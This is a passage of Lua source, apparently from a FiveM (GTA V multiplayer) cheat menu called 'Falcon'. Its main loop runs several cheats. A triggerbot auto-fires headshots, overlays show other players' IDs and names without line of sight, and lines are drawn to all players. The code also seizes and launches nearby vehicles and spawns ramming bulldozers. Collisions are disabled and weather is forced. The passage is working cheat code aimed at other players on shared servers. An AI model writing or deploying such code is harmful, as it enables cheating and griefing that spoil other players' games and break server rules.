                        ApplyForce(k, forward * 500)
                    end
                end
                
                for k in EnumerateVehicles() do
                    local coords = GetEntityCoords(k)
                    if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) and GetDistanceBetweenCoords(pos, coords) <= 3.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
            
            end
        end
        
        if Triggerbot then
            local hasTarget, target = GetEntityPlayerIsFreeAimingAt(PlayerId())
            if hasTarget and IsEntityAPed(target) then
                ShootAt(target, "SKEL_HEAD")
            end
        end
        
        if not Collision then
            playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
            for k in EnumerateVehicles() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumerateObjects() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumeratePeds() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
        end
        
        if DeadlyBulldozer then
            SetVehicleBulldozerArmPosition(GetVehiclePedIsIn(PlayerPedId(), 0), math.random() % 1, 1)
            SetVehicleEngineHealth(GetVehiclePedIsIn(PlayerPedId(), 0), 1000.0)
            if not IsPedInAnyVehicle(PlayerPedId(), 0) then
                DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 1))
                DeadlyBulldozer = not DeadlyBulldozer
            elseif IsDisabledControlJustPressed(0, Keys["E"]) then
                local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                local coords = GetEntityCoords(veh)
                local forward = GetEntityForwardVector(veh)
                local heading = GetEntityHeading(veh)
                local veh = CreateVehicle(GetHashKey("BULLDOZER"), coords.x + forward.x * 10, coords.y + forward.y * 10, coords.z, heading, 1, 1)
                SetVehicleColours(veh, 27, 27)
                SetVehicleEngineHealth(veh, -3500.0)
                ApplyForce(veh, forward * 500.0)
            end
        end
        
        if Falcon.IsMenuOpened('objectlist') then
            for i = 1, #SpawnedObjects do
                local x, y, z = table.unpack(GetEntityCoords(SpawnedObjects[i]))
                DrawText3D(x, y, z, "OBJECT " .. "[" .. i .. "] " .. "WITH ID " .. SpawnedObjects[i])
            end
        end
        
        if NametagsEnabled then
            tags_plist = GetActivePlayers()
            for i = 1, #tags_plist do
                if NetworkIsPlayerTalking(tags_plist[i]) then
                    SetMpGamerTagVisibility(ptags[i], 4, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 4, 0)
                end
                
                if IsPedInAnyVehicle(GetPlayerPed(tags_plist[i])) and GetSeatPedIsIn(GetPlayerPed(tags_plist[i])) == 0 then
                    SetMpGamerTagVisibility(ptags[i], 8, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 8, 0)
                end
            
            end
        end
        
        if ANametagsEnabled then
            local plist = GetActivePlayers()
            table.removekey(plist, PlayerId())
            for i = 1, #plist do
                local pos = GetEntityCoords(GetPlayerPed(plist[i]))
                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), pos)
                if distance <= 30 then
                    if ANametagsNotNeedLOS then
                        DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "\n~b~Name: ~w~" .. GetPlayerName(plist[i]))
                    elseif not ANametagsNotNeedLOS and HasEntityClearLosToEntity(PlayerPedId(), GetPlayerPed(plist[i]), 17) then
                        DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "\n~b~Name: ~w~" .. GetPlayerName(plist[i]))
                    end
                end
            end
        end
        
        if LinesEnabled then
            local plist = GetActivePlayers()
            local playerCoords = GetEntityCoords(PlayerPedId())
            for i = 1, #plist do
                if i == PlayerId() then i = i + 1 end
                local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
                DrawLine(playerCoords, targetCoords, 0, 0, 255, 255)
            end
        end

	if WeatherChanger then
	    SetWeatherTypePersist(WeatherType)
	    SetWeatherTypeNowPersist(WeatherType)
	    SetWeatherTypeNow(WeatherType)
	    SetOverrideWeather(WeatherType)
	end
        
        if Radio then
            PortableRadio = true
            SetRadioToStationIndex(RadioStation)
        elseif not Radio then
            PortableRadio = false
        end

        if PortableRadio then
            SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), false)
            SetMobilePhoneRadioState(true)
            SetMobileRadioEnabledDuringGameplay(true)
            HideHudComponentThisFrame(16)
        elseif not PortableRadio then
            SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), true)
            SetMobilePhoneRadioState(false)
            SetMobileRadioEnabledDuringGameplay(false)
            ShowHudComponentThisFrame(16)
            local radioIndex = GetPlayerRadioStationIndex()

            if IsPedInAnyVehicle(PlayerPedId(), false) and radioIndex + 1 ~= 19 then

                currRadioIndex = radioIndex + 1
                selRadioIndex = radioIndex + 1
            end
        end

        if ForceMap then
            DisplayRadar(true)
        end
        
        if ForceThirdPerson then
			SetFollowPedCamViewMode(0)
			SetFollowVehicleCamViewMode(0)
        end
        
        Wait(0)
    end
end)
